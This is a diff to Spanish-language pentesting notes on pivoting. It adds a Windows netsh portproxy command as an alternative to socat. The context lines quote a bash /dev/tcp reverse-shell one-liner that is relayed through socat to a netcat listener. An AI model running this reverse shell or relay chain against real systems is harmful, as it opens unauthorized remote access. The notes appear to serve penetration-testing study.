@@ -176,7 +176,15 @@ El flujo seria el siguiente:
 
 1. ***Objetivo*** envia revershell tradicional (***``/bin/bash -c '/bin/bash -i >& /dev/tcp/{IP}/{PUERTO}'``***) a maquina C
 
-2. ``Maquina C`` redirige ese trafico usando socat a ``Maquina B``, la cual a su vez envia todo ese trafico finalmente a nc, por eso digo que es como una especie de tobogán
+2. ``Maquina C`` redirige ese trafico usando socat a ``Maquina B``, la cual a su vez envia todo ese trafico finalmente a nc, por eso digo que es como una especie de tobogán.
+
+#### Alternativa a socat en windows - netsh
+
+Importante aclarar que para usar esta tecnica tienes que ser administrator de la maquina:
+
+```ruby
+netsh interface portproxy add v4tov4 listenport=<port to listen> listenaddress=<address to listen> connectport=<port to connect> connectaddress=<address to connect>
+```
 
 ### IMPORTANTE:
 
